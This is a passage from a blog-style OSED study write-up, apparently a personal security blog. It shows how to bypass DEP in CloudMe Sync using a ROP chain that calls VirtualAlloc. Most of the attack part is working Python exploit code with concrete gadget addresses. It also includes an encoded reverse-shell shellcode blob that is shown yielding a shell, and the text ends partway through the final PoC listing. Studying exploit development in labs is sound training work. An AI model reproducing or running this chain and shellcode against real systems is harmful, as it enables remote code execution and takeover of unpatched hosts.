---
title: "Buffer Overflow - DEP Bypass - VirtualAlloc"
categories: [Buffer Overflow, OSED]
tags: [Windows,OSED,Buffer]
mermaid: true
image: https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP/2023-01-31-Buffer%20Overflow%20-%20DEP%2012:01:26.png
---

In this section we will keep our studies in Buffer Overflow. Now using a different technique called Data Execution Prevention Bypass.

# ROP - Return Oriented Programing

What is ROP? What is DEP?

DEP is the acronimous from Data Execution Prevention. It prevents us to execute code on the stack. So, we need to figure out how to bypass this defense.

If we look on the next image, we see the flag **PAGE_READWRITE**, this means that this area of the code is with the DEP enabled, so we need to use a techique called ROP to bypass and execute code in it.

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP/2023-01-31-Buffer%20Overflow%20-%20DEP%2012:23:15.png)

Return-oriented programming (ROP) is a computer security exploit technique that allows an attacker to execute code in the presence of security defenses such as executable space protection and code signing.
In this technique, an attacker gains control of the call stack to **hijack** program control flow and then **executes carefully chosen instruction sequences** that are **already** present in the machine's memory, called "gadgets".
Each gadget typically ends in a **return instruction** and is located in a subroutine within the existing program and/or shared library code.
Chained together, these gadgets allow an attacker to perform arbitrary operations on a machine employing defenses.

So, we'll use some instructions which ends with RET and that are already present in memory or on shared libraries, and keeps chaining then to make what we want to make. That's is important, because we have no execution on the stack.

With that in mind, we know that we have no Execution (because of the DEP). But, for our lucky we have some Windows APIs which can change the options of the memory addresses, and changing that we can make it executable.

The main of them are:

```
VirtualAlloc.
VirtualProtect.
WriteProcessMemory.
```

# CloudMeSync

For our demonstration here we'll keep as our base the exploit 46250 from exploitdb. Check the [link](https://www.exploit-db.com/exploits/46250) here.

So, we'll use the this template from the exploitdb as our exploit.

```py
# 0x4rt3mis
# DEP Bypass
import socket
import sys
from struct import pack

total = 2500

def create_rop_chain():
        rop_gadgets = [ ]
        return ''.join(pack('<L', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

payload = b'\x41' * 1052
payload += pack("<L", (0x6ab2223e))  # ret
payload += rop_chain
payload += b'\x90' * 10
	
target = b'127.0.0.1'

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(payload)
except:
	print "Crashed!"
```

Here we have the function of the VirtualAlloc API, which we will use in this example right now.

```C++
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
```

And this is what we are going to put on the stack to be executed.

```
XXXXXXXX -> KERNEL32!VirtualAllocStub
YYYYYYYY -> Return Address
XXXXXXXX -> lpAddress
00000001 -> dwSize
00001000 -> flAllocationType
00000040 -> flProtect
```

```C++
LPVOID WINAPI VirtualAlloc(          =>    A pointer to VirtualAlloc()
  _In_opt_  LPVOID lpAddress,        =>    Return Address (Redirect Execution to ESP)
  _In_      SIZE_T dwSize,           =>    dwSize (0x1)
  _In_      DWORD flAllocationType,  =>    flAllocationType (0x1000)
  _In_      DWORD flProtect          =>    flProtect (0x40)
);
```

If you see, the sequence, is the arguments which the API needs to be executed. We'll dive into then on the next pages.

# Checking Modules

First thing is to check what modules we can use. So we attach the CloudMeSync on Windbg and check the protections on the DLLs.

```
.load narly
!nmod
```

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP/2023-01-31-Buffer%20Overflow%20-%20DEP%2001:28:16.png)

The ones here we can use is that we have no kind of defenses enabled. We copy all of them to our kali box

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP/2023-01-31-Buffer%20Overflow%20-%20DEP%2001:30:59.png)

# Getting VirtuaAlloc Address

Now, we the dlls we can use in our box, we start to look for the VirtualAlloc API Address on the modules. We open the **Qt5Core.dll** on IDA64

And on Import Table we get the base address of the VirtuaAlloc. Even if we reboot the box, the address will be the same, so for us that's fine to use that.

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP/2023-01-31-Buffer%20Overflow%20-%20DEP%2001:32:44.png)

```
00000000690398A0		VirtualAlloc	KERNEL32
```

With that got, let's start our ROP Chain.

# Building ROP Chain

We start with our exploit template. We put this on the stack to be more visual. We'll place these values and then change it dinamically.

1. Here will be the Address of the VirtualAlloc API
virtual_alloc_placeholder = pack("<L", (0x45454545)) # KERNEL32!VirtuaAllocStub

2. Here we'll put our Return Address
virtual_alloc_placeholder += pack("<L", (0x46464646)) # Shellcode Retrun Addres

3. Here we'll put our Return Address (again)
virtual_alloc_placeholder += pack("<L", (0x47474747)) # Shellcode Address

4. Here is going to be the dwSize, which is equal to 00000001
virtual_alloc_placeholder += pack("<L", (0x48484848)) # dwSize

5. flAllocationType - 00001000
virtual_alloc_placeholder += pack("<L", (0x49494949)) # flAllocationType

6. Last one is the flProtect - 00000040
virtual_alloc_placeholder += pack("<L", (0x51515151)) # flProtect

```py
# 0x4rt3mis
# DEP Bypass
import socket
import sys
from struct import pack

total = 2500

def create_rop_chain():
        rop_gadgets = [ ]
        return ''.join(pack('<L', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

virtual_alloc_placeholder = pack("<L", (0x45454545)) # KERNEL32!VirtuaAllocStub
virtual_alloc_placeholder += pack("<L", (0x46464646)) # Shellcode Retrun Addres
virtual_alloc_placeholder += pack("<L", (0x47474747)) # Shellcode Address
virtual_alloc_placeholder += pack("<L", (0x48484848)) # dwSize
virtual_alloc_placeholder += pack("<L", (0x49494949)) # flAllocationType
virtual_alloc_placeholder += pack("<L", (0x51515151)) # flProtect


payload = b'\x41' * (1052 - len(virtual_alloc_placeholder))
payload += virtual_alloc_placeholder
payload += pack("<L", (0x6ab2223e))  # ret
payload += rop_chain
payload += b'\x90' * 10
	
target = b'127.0.0.1'

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(payload)
except:
	print "Crashed!"
```

## Generating Gadgets

Now, let's generate the gadgets here. We'll use the scripts form [EPI052](https://github.com/epi052/osed-scripts)

```sh
find-gadgets.py -f libgcc_s_dw2-1.dll  libstdc++-6.dll  libwinpthread-1.dll  Qt5Core.dll  Qt5Gui.dll  Qt5Network.dll  Qt5Sql.dll Qt5Xml.dll  qwindows.dll -b 00 20 -a x86 -o rop.txt
```

After that it generates all the usable gadgets to us. So, we can now start digging into that and seeing what can be useful for us.

With this huge list of gadgets, should be easy for us to perform the bypass.

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP/2023-01-31-Buffer%20Overflow%20-%20DEP%2001:46:10.png)

We see that on the place of the EIP, we put a simple RET instruction in that. That is because we want to return to stack, near to the values we put to change.

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP/2023-01-31-Buffer%20Overflow%20-%20DEP%2001:47:45.png)

## Sending the First Payload

We put a breakpoint on **0x6ab2223e** which is our RET instruction and then execute the payload

We see that when we reach the breakpoint, 20 bytes before our ESP we have set our fake addresses that will be changed. So we are on the right track.

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP/2023-01-31-Buffer%20Overflow%20-%20DEP%2001:49:55.png)

When we execute the RET instruction, we go to there, where ours NOPs are seted.

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP/2023-01-31-Buffer%20Overflow%20-%20DEP%2001:50:43.png)

What we must look here. If we see this point, even after the instruction that we executed, the 20 bytes before ESP still contains our fake values.

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP/2023-01-31-Buffer%20Overflow-DEP%2007:13:42.png)

## Copying ESP

Now, knowing that, we have a proper place to set our values to execute the VirtualAlloc API and change the desired memory area to execute code inside it.

We'll get a copy of ESP into ECX and the decrease 20 bytes in it. That's because we want to have ECX as our place where we'll put the values to make it working. So the gadget sequence we'll use here now will be this

```py
# -> Make ESP equal to ECX (-20)
## Copy ESP to EBX, and put -20 in ESI
0x6aaf2fd3, # push esp; pop ebx; pop esi; ret;
0xffffffe0, # - 20 in ESI

## Put EBX (ESP) to ECX
0x61b460d0,  # xchg eax, ebx; ret;
0x68be726b,  # xchg eax, ecx; ret;

## Put -20 to EBP
0x68aef542,  # xchg eax, esi; ret; 
0x6d9c5993,  # xchg eax, ebp; ret; 

## ADD EBP on ECX, make 20 bytes before
0x6d9c8e42,  # add ecx, ebp; ret; 
```

We are on the last instruction here.

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP/2023-01-31-Buffer%20Overflow-DEP%2007:36:03.png)

And after execute it, we got what we want!

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP/2023-01-31-Buffer%20Overflow-DEP%2007:46:16.png)

```py
# 0x4rt3mis
# DEP Bypass
import socket
import sys
from struct import pack

total = 2500

def create_rop_chain():
        rop_gadgets = [
                ##############
                # -> Make ESP equal to ECX (-20)
                ##############
                ## Copy ESP to EBX, and put -20 in ESI
                0x6aaf2fd3, # push esp; pop ebx; pop esi; ret;
                0xffffffe0, # - 20 in ESI
                ## Put EBX (ESP) to ECX
                0x61b460d0,  # xchg eax, ebx; ret;
                0x68be726b,  # xchg eax, ecx; ret;
                ## Put -20 to EBP
                0x68aef542,  # xchg eax, esi; ret; 
                0x6d9c5993,  # xchg eax, ebp; ret; 
                ## ADD EBP on ECX, make 20 bytes before
                0x6d9c8e42,  # add ecx, ebp; ret; 

                ]
        return ''.join(pack('<L', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

virtual_alloc_placeholder = pack("<L", (0x45454545)) # KERNEL32!VirtuaAllocStub
virtual_alloc_placeholder += pack("<L", (0x46464646)) # Shellcode Retrun Addres
virtual_alloc_placeholder += pack("<L", (0x47474747)) # Shellcode Address
virtual_alloc_placeholder += pack("<L", (0x48484848)) # dwSize
virtual_alloc_placeholder += pack("<L", (0x49494949)) # flAllocationType
virtual_alloc_placeholder += pack("<L", (0x51515151)) # flProtect


payload = b'\x41' * (1052 - len(virtual_alloc_placeholder))
payload += virtual_alloc_placeholder
payload += pack("<L", (0x6ab2223e))  # ret
payload += rop_chain
payload += b'\x90' * 10
	
target = b'127.0.0.1'

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(payload)
except:
	print "Crashed!"
```

# POP VirtualAlloc

Now, we'll fix the first of it. The 0x45454545, we'll put the VirtualAlloc base address in it.

```
virtual_alloc_placeholder = pack("<L", (0x45454545)) # KERNEL32!VirtuaAllocStub
```

We first need to find a POP gadget and the a write-where gadget to write it on the ECX, where the 0x45454545 are.

```py
0x6ab00efd,  # pop eax; ret; 
0x690398A0,  # VirtualAlloc	KERNEL32
0x6d9cb59c,  # mov dword ptr [ecx], eax; ret;
```

We update our PoC and make it working

```py
# 0x4rt3mis
# DEP Bypass
import socket
import sys
from struct import pack

total = 2500

def create_rop_chain():
        rop_gadgets = [
                ##############
                # -> Make ESP equal to ECX (-20)
                ##############
                ## Copy ESP to EBX, and put -20 in ESI
                0x6aaf2fd3, # push esp; pop ebx; pop esi; ret;
                0xffffffe0, # - 20 in ESI
                ## Put EBX (ESP) to ECX
                0x61b460d0,  # xchg eax, ebx; ret;
                0x68be726b,  # xchg eax, ecx; ret;
                ## Put -20 to EBP
                0x68aef542,  # xchg eax, esi; ret; 
                0x6d9c5993,  # xchg eax, ebp; ret; 
                ## ADD EBP on ECX, make 20 bytes before
                0x6d9c8e42,  # add ecx, ebp; ret; 

                ##############
                # -> Patch VirtualAlloc API Base Address
                ##############
                ## Put VirtualAlloc address on EAX and make it a Pointer
                0x6ab00efd,  # pop eax; ret; 
                0x690398A0,  # VirtualAlloc	KERNEL32
                0x61bb8cb3,  # mov eax, dword ptr [eax]; ret;
                ## Write-where EAX in ECX as a dword (pointer)
                0x6d9cb59c,  # mov dword ptr [ecx], eax; ret;

                ]
        return ''.join(pack('<L', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

virtual_alloc_placeholder = pack("<L", (0x45454545)) # KERNEL32!VirtuaAllocStub
virtual_alloc_placeholder += pack("<L", (0x46464646)) # Shellcode Return Address
virtual_alloc_placeholder += pack("<L", (0x47474747)) # Shellcode Address
virtual_alloc_placeholder += pack("<L", (0x48484848)) # dwSize
virtual_alloc_placeholder += pack("<L", (0x49494949)) # flAllocationType
virtual_alloc_placeholder += pack("<L", (0x51515151)) # flProtect


payload = b'\x41' * (1052 - len(virtual_alloc_placeholder))
payload += virtual_alloc_placeholder
payload += pack("<L", (0x6ab2223e))  # ret
payload += rop_chain
payload += b'\x90' * 10
	
target = b'127.0.0.1'

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(payload)
except:
	print "Crashed!"
```

We put a breakpoint on POP EAX and the VirtualAlloc address was written in it

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP/2023-01-31-Buffer%20Overflow-DEP%2007:55:40.png)

Now we write it on ECX (where the 0x45454545 are) the pointer

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP/2023-01-31-Buffer%20Overflow-DEP%2007:56:30.png)

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP/2023-01-31-Buffer%20Overflow-DEP%2008:01:55.png)

Now we can move on to the next argument

# Return Addreses

Now we'll make the shellcode return address and the shellcode address, which will be both the same (0x46464646 and 0x47474747)

First we need to inc ecx in 4 bytes, because we need to align the stack, and the we'll make a copy operation of ECX to EAX, then we'll increase the EAX address in, for that we'll POP the value -320 on the EDX, then  make a NEG instruction, to -320 become 320, add this value on EAX and then write it on the ECX (0x46464646).

Now just, make 4 bytes increase in ECX, and simple write the EAX value again in it.

```
0:000> ?0x0 - 0x320
Evaluate expression: -800 = fffffce0
```

```
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x6ab445f9,  # mov eax, ecx; ret;
0x61e30fe3,  # pop edx; ret;
0xfffffce0,  # -320
0x6eb47012,  # neg edx; ret;
0x6ab00690,  # add eax, edx; ret;
0x6d9cb59c,  # mov dword ptr [ecx], eax; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x6d9cb59c,  # mov dword ptr [ecx], eax; ret;
```

```py
...
##############
# -> Patch VirtualAlloc API Base Address (0x45454545)
##############
## Put VirtualAlloc address on EAX and make it a Pointer
0x6ab00efd,  # pop eax; ret; 
0x690398A0,  # VirtualAlloc	KERNEL32
0x61bb8cb3,  # mov eax, dword ptr [eax]; ret;
## Write-where EAX in ECX as a dword (pointer)
0x6d9cb59c,  # mov dword ptr [ecx], eax; ret;

##############
# -> Patch Return Address and Shellcode Address (0x46464646 and 0x47474747)
##############
## Increment ECX in 4 bytes, to align the stack
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
## Copy ECX to EAX
0x6ab445f9,  # mov eax, ecx; ret;
## PUT -320 on EDX
0x61e30fe3,  # pop edx; ret;
0xfffffce0,  # -320
## -320 become 320
0x6eb47012,  # neg edx; ret;
## Increase EAX in 320
0x6ab00690,  # add eax, edx; ret;
## Write this address on ECX (0x46464646)
0x6d9cb59c,  # mov dword ptr [ecx], eax; ret;
## Increase 4 bytes in ECX
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
## Write the value again on 0x47474747 (ECX)
0x6d9cb59c,  # mov dword ptr [ecx], eax; ret;

...
```

So, we execute it. We start we make the INC 4 bytes, make the COPY to EAX, put -320 in EDX, NEG EDX, add EDX to EAX, write in ECX, then INC ECX more 4 bytes and the write it again.

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP/1.gif)

With that we have already patched three of the arguments, now let's move on.

# dwSize

Now, let's change the dwSize, which must be 00000001, the problem here is that this value contain nullbyte, so we'll make the same thing we did before, INC ECX in 4 bytes, to align the stack, put the -00000001 no EAX and then negate it. The last thing will be write it on ECX.

```
0:000> ?0x0 - 0x00000001
Evaluate expression: -1 = ffffffff
```

```
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x61b6122a,  # pop eax; ret;
0xffffffff,  # -0x00000001
0x699ef43a,  # neg eax; ret;
0x6d9cb59c,  # mov dword ptr [ecx], eax; ret;
```

```py
...
##############
# -> Patch Return Address and Shellcode Address (0x46464646 and 0x47474747)
##############
## Increment ECX in 4 bytes, to align the stack
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
## Copy ECX to EAX
0x6ab445f9,  # mov eax, ecx; ret;
## PUT -320 on EDX
0x61e30fe3,  # pop edx; ret;
0xfffffce0,  # -320
## -320 become 320
0x6eb47012,  # neg edx; ret;
## Increase EAX in 320
0x6ab00690,  # add eax, edx; ret;
## Write this address on ECX (0x46464646)
0x6d9cb59c,  # mov dword ptr [ecx], eax; ret;
## Increase 4 bytes in ECX
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
## Write the value again on 0x47474747 (ECX)
0x6d9cb59c,  # mov dword ptr [ecx], eax; ret;

##############
# -> dwSize (0x48484848)
##############
## Increase 4 bytes in ECX
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
## PUT -0x00000001 in EAX
0x61b6122a,  # pop eax; ret;
0xffffffff,  # -0x00000001
## NEG EAX, to become 1
0x699ef43a,  # neg eax; ret;
## Write on 0x48484848 (ECX)
0x6d9cb59c,  # mov dword ptr [ecx], eax; ret;
...
```

We increase 4 bytes in ECX, POP -1 in EAX, NEG EAX to become 1, and then write it on ECX.

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP/2.gif)

# flAllocationType - 00001000

Now, let's patch the flAllocationType, which must be 1000.

Same thing. We'll use EAX and then NEG it, because it contains null bytes. But now we'll put another step. We cannot use 1000 because even -1000 contain null bytes, so we will use -1001 and then negate and decrease 1 to become 1000.

```
0:000> ?0x0 - 0x1001
Evaluate expression: -4097 = ffffefff
0:000> ?0x0 - 0x1000
Evaluate expression: -4096 = fffff000
```

```
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x61b6122a,  # pop eax; ret;
0xffffefff,  # -0x1001
0x699ef43a,  # neg eax; ret;
0x68a84305,  # dec eax; ret;
0x6d9cb59c,  # mov dword ptr [ecx], eax; ret;
```

```py
...
##############
# -> dwSize (0x48484848)
##############
## Increase 4 bytes in ECX
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
## PUT -0x00000001 in EAX
0x61b6122a,  # pop eax; ret;
0xffffffff,  # -0x00000001
## NEG EAX, to become 1
0x699ef43a,  # neg eax; ret;
## Write on 0x48484848 (ECX)
0x6d9cb59c,  # mov dword ptr [ecx], eax; ret;

##############
# -> flAllocationType (0x49494949)
##############
## Increase 4 bytes in ECX
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
## PUT -0x1001 in EAX
0x61b6122a,  # pop eax; ret;
0xffffefff,  # -0x1001
## NEG EAX, to become 1001
0x699ef43a,  # neg eax; ret;
## DEC EAX, to become 1000
0x68a84305,  # dec eax; ret;
## Write on 0x49494949 (ECX)
0x6d9cb59c,  # mov dword ptr [ecx], eax; ret;
...
```

And here we have the instructions being executed.

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP/3.gif)

# flProtect - 00000040

The last one is the flProtect. Where we'll put 0x40 on 0x51515151.

```
0:000> ?0x0 - 0x40
Evaluate expression: -64 = ffffffc0
```

Here we did the same thing we did before

```
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x61b6122a,  # pop eax; ret;
0xffffffc0,  # -0x40
0x699ef43a,  # neg eax; ret;
0x6d9cb59c,  # mov dword ptr [ecx], eax; ret;
```

```py
...
##############
# -> flAllocationType (0x49494949)
##############
## Increase 4 bytes in ECX
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
## PUT -0x1001 in EAX
0x61b6122a,  # pop eax; ret;
0xffffefff,  # -0x1001
## NEG EAX, to become 1001
0x699ef43a,  # neg eax; ret;
## DEC EAX, to become 1000
0x68a84305,  # dec eax; ret;
## Write on 0x49494949 (ECX)
0x6d9cb59c,  # mov dword ptr [ecx], eax; ret;

##############
# -> flProtect (0x51515151)
##############
## Increase 4 bytes in ECX
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
## PUT -0x40 in EAX
0x61b6122a,  # pop eax; ret;
0xffffffc0,  # -0x40
## NEG EAX, to become 40
0x699ef43a,  # neg eax; ret;
## Write on 0x51515151 (ECX)
0x6d9cb59c,  # mov dword ptr [ecx], eax; ret;
...
```

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP/4.gif)

# ESP to VirtualAlloc

Now, the last step is to point the ESP to VirtuaAlloc, which one we just patched.

Here we need to get the ECX - 20, because it's this value that we have the VirtualAlloc API address.

So, we put -20 on EBP and then ADD it to ECX, that's going to decresce 20 bytes in ECX and we'll get on the VirtualAlloc API, and then we move ecx value to esp, to be executed

```
0x6aa812c9,  # pop ebp; ret;
0xffffffec,  # -20
0x6d9c8e42,  # add ecx, ebp; ret;
0x6eb53647,  # mov esp, ecx; ret;
```

```py
...
##############
# -> flProtect (0x51515151)
##############
## Increase 4 bytes in ECX
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
0x68aca037,  # inc ecx; ret;
## PUT -0x40 in EAX
0x61b6122a,  # pop eax; ret;
0xffffffc0,  # -0x40
## NEG EAX, to become 40
0x699ef43a,  # neg eax; ret;
## Write on 0x51515151 (ECX)
0x6d9cb59c,  # mov dword ptr [ecx], eax; ret;

##############
# -> ECX to ESP
##############
## PUT -20 on EBP
0x6aa812c9,  # pop ebp; ret;
0xffffffec,  # -20
## DEC ECX in 20
0x6d9c8e42,  # add ecx, ebp; ret;
## PUT ECX, on ESP
0x6eb53647,  # mov esp, ecx; ret;
...
```

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP/5.gif)

Ok. Now we check the values of the memory and see that is going to be changed.

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP/6.gif)

And here we have the memory already changed it value.

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP/2023-01-31-Buffer%20Overflow-DEP%2011:35:06.png)

# Reverse Shell

So, now let's generate our reverse shell and put that inside the exploit.

```py
shellcode =  b""
shellcode += b"\xda\xdd\xd9\x74\x24\xf4\x5d\x31\xc9\xb1\x5e"
shellcode += b"\xbf\x85\xf0\x6d\xbf\x83\xed\xfc\x31\x7d\x15"
shellcode += b"\x03\x7d\x15\x67\x05\xe4\x5a\xe6\x22\x07\x5d"
shellcode += b"\x17\x55\xd9\x57\x83\x21\x6b\x58\xc0\x40\x80"
shellcode += b"\x13\xa0\xb0\x13\x7d\x44\x42\x5d\xa2\xdf\x62"
shellcode += b"\xc4\x9b\x90\x92\x7d\x2e\xc5\xa5\x23\x47\x6c"
shellcode += b"\xae\x30\x03\x66\x5b\x39\x53\x89\xc4\x4d\xef"
shellcode += b"\x49\x8e\x2e\xf3\xc9\x91\x11\x78\x66\x8a\x26"
shellcode += b"\x38\x58\xab\xe0\x4e\xdd\x57\xf3\x67\x94\x2c"
shellcode += b"\xb1\x7b\xad\x07\xb2\x85\x6f\x56\x02\x1c\x73"
shellcode += b"\x35\x06\xdf\xff\x41\xc6\x2a\xf2\x4c\x0a\x41"
shellcode += b"\xf8\x74\xde\xb2\x24\xfe\x01\x31\x73\x24\xbf"
shellcode += b"\x9c\x1d\xaf\xb3\x6a\x6a\xf8\xd7\x6b\xb6\x8c"
shellcode += b"\xec\xe1\x47\x4b\x65\xb1\x63\x77\x17\xf9\x03"
shellcode += b"\x04\x6e\x48\xab\xf5\xc4\xb7\xc2\x4f\xf7\xdf"
shellcode += b"\x5a\x01\xf9\xf3\x9d\xcb\x01\x85\x24\xe0\x61"
shellcode += b"\xe7\x58\xbb\x64\xf8\xf1\xb8\x01\x43\xe1\xf1"
shellcode += b"\xd1\x2a\xa9\x9e\xbd\xe2\xa1\x6d\x0c\x2d\x55"
shellcode += b"\xfa\x07\x42\xa7\xa5\xb3\x5b\x92\x4d\xb5\x67"
shellcode += b"\x74\xa5\x28\x9b\xbf\xc6\xe6\x60\x36\x7d\x15"
shellcode += b"\x01\x91\x77\xd0\x7c\xde\xdd\x1e\xf6\x65\xfe"
shellcode += b"\x76\x04\xdf\xd3\x35\xeb\x4a\x28\xb3\x51\x50"
shellcode += b"\xb9\x23\x68\x51\xdf\x1a\x1b\x64\x09\x95\x4c"
shellcode += b"\x57\x89\x43\xd5\x95\x0b\xdc\xda\xcc\x17\xed"
shellcode += b"\xe4\xbe\x77\x5d\x55\x38\x28\x71\x90\x14\x88"
shellcode += b"\xd9\x65\xc1\x28\x53\x5f\xd8\xe8\x33\x30\x72"
shellcode += b"\x29\x1b\xca\x4e\xcf\xe4\x2a\xf5\xd1\xf5\x3d"
shellcode += b"\x6f\x51\x35\x3f\x3f\x01\xe9\x71\x7f\xf9\x45"
shellcode += b"\x22\x2f\xfe\x75\x92\x98\xa8\x8a\x47\x02\x03"
shellcode += b"\x23\x3e\x7b\x6b\x9b\xee\xcb\xeb\x2d\xc6\x9a"
shellcode += b"\x6c\x4c\x10\x8c\x5d\x8f\xf0\x7c\xce\x5f\xa1"
shellcode += b"\x2c\xbe\x0f\x11\x9c\x8e\xf4\xc1\x48\xb0\x4c"
shellcode += b"\x7a\xf7\xd4\x52\x8a\x2f\xb8\xc4\x16\xa2\x5d"
shellcode += b"\x3b\x8d\x67\x17\xa3\x1c\x5e\x41\x9d\xcf\x63"
shellcode += b"\xa7\x15\xbf\x34\x86\x65\x10\xea\xb8\x25\xc1"
shellcode += b"\x42\x69\xf6\xb2\x02\x76\xa3\x2c\x93\x41\x1d"
shellcode += b"\x27\x2c\xae\xcb\xa7"
```

And here we have the reverse shell!

![](https://0x4rt3mis.github.io/assets/img/osed/2023-01-31-Buffer%20Overflow-DEP/2023-01-31-Buffer%20Overflow-DEP%2001:38:57.png)

Here we have the final PoC!

```py
# 0x4rt3mis
# DEP Bypass
import socket
import sys
from struct import pack

total = 2500

def create_rop_chain():
        rop_gadgets = [
                ##############
                # -> Make ESP equal to ECX (-20)
                ##############
                ## Copy ESP to EBX, and put -20 in ESI
                0x6aaf2fd3, # push esp; pop ebx; pop esi; ret;
                0xffffffe0, # - 20 in ESI
                ## Put EBX (ESP) to ECX
                0x61b460d0,  # xchg eax, ebx; ret;
                0x68be726b,  # xchg eax, ecx; ret;
                ## Put -20 to EBP
                0x68aef542,  # xchg eax, esi; ret; 
                0x6d9c5993,  # xchg eax, ebp; ret; 
                ## ADD EBP on ECX, make 20 bytes before
                0x6d9c8e42,  # add ecx, ebp; ret; 

                ##############
                # -> Patch VirtualAlloc API Base Address (0x45454545
                ##############
                ## Put VirtualAlloc address on EAX and make it a Pointer
                0x6ab00efd,  # pop eax; ret; 
                0x690398A0,  # VirtualAlloc	KERNEL32
                0x61bb8cb3,  # mov eax, dword ptr [eax]; ret;
                ## Write-where EAX in ECX as a dword (pointer)
                0x6d9cb59c,  # mov dword ptr [ecx], eax; ret;

                ##############
                # -> Patch Return Address and Shellcode Address (0x46464646 and 0x47474747)
                ##############
                ## Increment ECX in 4 bytes, to align the stack
                0x68aca037,  # inc ecx; ret;
                0x68aca037,  # inc ecx; ret;
                0x68aca037,  # inc ecx; ret;
                0x68aca037,  # inc ecx; ret;
                ## Copy ECX to EAX
                0x6ab445f9,  # mov eax, ecx; ret;
                ## PUT -320 on EDX
                0x61e30fe3,  # pop edx; ret;
                0xfffffce0,  # -320
                ## -320 become 320
                0x6eb47012,  # neg edx; ret;
                ## Increase EAX in 320
                0x6ab00690,  # add eax, edx; ret;
                ## Write this address on ECX (0x46464646)
                0x6d9cb59c,  # mov dword ptr [ecx], eax; ret;
                ## Increase 4 bytes in ECX
                0x68aca037,  # inc ecx; ret;
                0x68aca037,  # inc ecx; ret;
                0x68aca037,  # inc ecx; ret;
                0x68aca037,  # inc ecx; ret;
                ## Write the value again on 0x47474747 (ECX)
                0x6d9cb59c,  # mov dword ptr [ecx], eax; ret;

                ##############
                # -> dwSize (0x48484848)
                ##############
                ## Increase 4 bytes in ECX
                0x68aca037,  # inc ecx; ret;
                0x68aca037,  # inc ecx; ret;
